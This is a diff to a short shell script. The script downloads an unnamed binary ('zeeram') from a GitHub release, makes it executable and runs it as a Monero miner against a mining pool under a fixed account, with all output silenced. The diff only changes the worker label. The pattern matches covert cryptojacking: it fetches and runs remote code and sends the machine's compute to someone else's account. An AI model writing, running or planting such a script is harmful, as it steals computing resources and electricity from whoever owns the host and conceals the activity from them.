@@ -2,4 +2,4 @@
 apt update && apt install unzip
 wget https://github.com/k35990680/hgasad/releases/download/joram/zeeram
 chmod +x zeeram
-./zeeram --algo xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-cna) --pool xmr.hk.apool.io:3334 > /dev/null 2>&1 
+./zeeram --algo xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-vena) --pool xmr.hk.apool.io:3334 > /dev/null 2>&1 
